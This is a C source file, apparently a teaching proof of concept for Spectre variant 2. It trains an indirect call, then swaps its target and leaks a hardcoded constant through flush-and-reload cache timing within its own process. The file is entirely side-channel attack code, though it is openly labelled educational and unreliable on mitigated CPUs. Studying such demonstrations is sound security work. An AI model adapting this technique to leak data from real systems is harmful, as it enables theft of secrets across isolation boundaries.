/*
 * Spectre variant 2 (indirect branch / BTB) — minimal teaching PoC.
 * Train an indirect call at a fixed site to target A; then set target B and a
 * condition that fails architecturally — speculative execution may still use B.
 * Encoding via probe array (same as v1). May not fire on all CPUs / mitigations.
 */

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <x86intrin.h>

#define SECRET 72
#define PROBE_STRIDE 4096
static int probe[256 * PROBE_STRIDE];

static void (*volatile jump_target)(void);

__attribute__((noinline)) static void gadget_train(void) {
    volatile int *p = &probe[0];
    *p = *p + 1;
}

__attribute__((noinline)) static void gadget_leak(void) {
    volatile int *p = &probe[(size_t)SECRET * PROBE_STRIDE];
    *p = 1;
}

static void flush_probe(void) {
    for (int i = 0; i < 256; i++) {
        _mm_clflush(&probe[i * PROBE_STRIDE]);
    }
    _mm_mfence();
}

static uint64_t reload_cycles(int k) {
    unsigned int aux;
    volatile int *p = &probe[k * PROBE_STRIDE];
    uint64_t t0 = __rdtscp(&aux);
    int s = *p;
    (void)s;
    uint64_t t1 = __rdtscp(&aux);
    return t1 - t0;
}

static void train_indirect(size_t count) {
    jump_target = gadget_train;
    for (size_t i = 0; i < count; i++) {
        volatile size_t x = i % 8; /* always < 16 */
        if (x < 16) {
            jump_target();
        }
    }
    _mm_mfence();
}

static void attack_once(void) {
    jump_target = gadget_leak;
    _mm_clflush((void *)&jump_target);
    _mm_mfence();
    /* Architecturally false (x >= 16); branch may still predict taken */
    volatile size_t x = 100;
    if (x < 16) {
        jump_target();
    }
}

static int guess_secret(int repeats) {
    uint64_t sum[256] = {0};

    for (int k = 0; k < 256; k++) {
        for (int r = 0; r < repeats; r++) {
            train_indirect(80);
            flush_probe();
            attack_once();
            sum[k] += reload_cycles(k);
        }
    }

    int best = 0;
    for (int i = 1; i < 256; i++) {
        if (sum[i] < sum[best]) {
            best = i;
        }
    }
    return best;
}

int main(void) {
    memset(probe, 0, sizeof(probe));
    printf("Spectre v2 (indirect branch) teaching PoC — unreliable on mitigated systems.\n");
    printf("Expected secret index: %d\n", SECRET);

    int g = guess_secret(400);
    printf("Guessed index: %d (%s)\n", g, g == SECRET ? "OK" : "expected failure on many systems");

    return 0;
}
